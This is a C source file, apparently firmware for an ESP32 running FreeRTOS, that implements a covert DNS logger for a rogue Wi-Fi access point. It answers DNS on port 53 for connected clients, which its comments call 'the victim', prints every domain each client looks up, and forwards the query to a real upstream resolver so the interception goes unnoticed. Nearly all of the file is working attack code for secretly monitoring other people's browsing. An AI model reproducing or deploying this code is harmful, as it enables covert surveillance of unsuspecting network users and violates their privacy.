#include "dns_spy.h"
#include <string.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "esp_log.h"

static const char *TAG = "dnsspy";
static uint32_t s_upstream;   // upstream DNS, IPv4 network order

// Pull the queried domain out of a DNS query (QNAME at offset 12, length-prefixed
// labels). Queries carry no name compression, so this stays simple.
static int parse_qname(const uint8_t *buf, int len, char *out, int outlen)
{
    int pos = 12, o = 0;
    while (pos < len) {
        int l = buf[pos++];
        if (l == 0) break;
        if ((l & 0xC0) || pos + l > len) break;   // compression / overrun: stop
        if (o && o < outlen - 1) out[o++] = '.';
        for (int i = 0; i < l && o < outlen - 1 && pos < len; i++) out[o++] = buf[pos++];
    }
    out[o] = '\0';
    return o;
}

static void dns_spy_task(void *arg)
{
    int cs = socket(AF_INET, SOCK_DGRAM, 0);     // client-facing (SoftAP side)
    if (cs < 0) { ESP_LOGE(TAG, "socket failed"); vTaskDelete(NULL); return; }
    struct sockaddr_in me = { 0 };
    me.sin_family = AF_INET;
    me.sin_port = htons(53);
    me.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(cs, (struct sockaddr *)&me, sizeof(me)) < 0) {
        ESP_LOGE(TAG, "bind :53 failed"); close(cs); vTaskDelete(NULL); return;
    }
    ESP_LOGW(TAG, "DNS logger active: every lookup from the victim is printed as DNSSPY");

    uint8_t buf[600];
    while (1) {
        struct sockaddr_in cli; socklen_t cl = sizeof(cli);
        int n = recvfrom(cs, buf, sizeof(buf), 0, (struct sockaddr *)&cli, &cl);
        if (n < 13) continue;

        char name[256];
        if (parse_qname(buf, n, name, sizeof(name)) > 0) {
            printf("DNSSPY %s\n", name);         // <-- the victim just looked this up
        }

        // forward the query upstream and relay the real answer back
        int us = socket(AF_INET, SOCK_DGRAM, 0);
        if (us < 0) continue;
        struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
        setsockopt(us, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        struct sockaddr_in up = { 0 };
        up.sin_family = AF_INET;
        up.sin_port = htons(53);
        up.sin_addr.s_addr = s_upstream;
        sendto(us, buf, n, 0, (struct sockaddr *)&up, sizeof(up));
        int rn = recvfrom(us, buf, sizeof(buf), 0, NULL, NULL);
        if (rn > 0) sendto(cs, buf, rn, 0, (struct sockaddr *)&cli, cl);
        close(us);
    }
}

void dns_spy_start(uint32_t upstream_ip)
{
    s_upstream = upstream_ip;
    xTaskCreate(dns_spy_task, "dnsspy", 4096, NULL, 5, NULL);
}
